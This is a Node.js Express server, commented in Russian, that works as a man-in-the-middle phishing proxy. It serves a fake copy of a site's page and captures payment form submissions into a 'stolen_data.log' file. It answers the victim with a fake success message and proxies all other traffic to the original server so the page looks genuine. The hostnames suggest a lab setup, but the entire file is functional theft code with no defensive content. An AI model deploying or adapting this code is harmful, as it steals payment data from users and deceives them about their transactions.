import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import httpProxy from 'http-proxy';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = 8081;
const proxy = httpProxy.createProxyServer({});

// Middleware для парсинга данных
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Создаем папку для логов
const logDir = '/app/logs';
if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });
}

// Логируем перехваченные данные
function logStolen(data, source = 'unknown') {
    const logEntry = {
        timestamp: new Date().toISOString(),
        source: source,
        data: data
    };
    console.log("🔥🔥🔥 ПЕРЕХВАЧЕНЫ ДАННЫЕ:", logEntry);
    
    // Сохраняем в файл
    fs.appendFileSync(path.join(logDir, 'stolen_data.log'), JSON.stringify(logEntry) + '\n');
}

// Отдаём фишинговую страницу (выглядит как оригинал)
app.get('/', (req, res) => {
    console.log("🎯 MITM: Жертва зашла на поддельный сайт");
    res.sendFile(path.join(__dirname, 'public', 'fake-index.html'));
});

// ПЕРЕХВАТЫВАЕМ оплату (вместо проксирования)
app.post("/api/payment", (req, res) => {
    console.log("🕵️ MITM: Перехватываем оплату!");
    logStolen(req.body, 'payment_form');
    
    // Отправляем фейковый ответ (жертва думает, что всё ок)
    res.json({ 
        status: "success", 
        message: "Оплата принята",
        transaction_id: "txn_" + Date.now()
    });
});

// Проксируем все остальные запросы к оригинальному серверу
// (чтобы сайт выглядел нормально)
app.use((req, res) => {
    console.log(`📡 MITM: Проксируем ${req.method} ${req.url}`);
    proxy.web(req, res, { 
        target: 'http://original:8080',
        changeOrigin: true 
    });
});

// Обработка ошибок прокси
proxy.on('error', (err, req, res) => {
    console.log('⚠️ Прокси ошибка:', err.message);
    res.status(500).send('Server error');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🎭 MITM-сервер (подменяет оригинал) → http://localhost:8081`);
});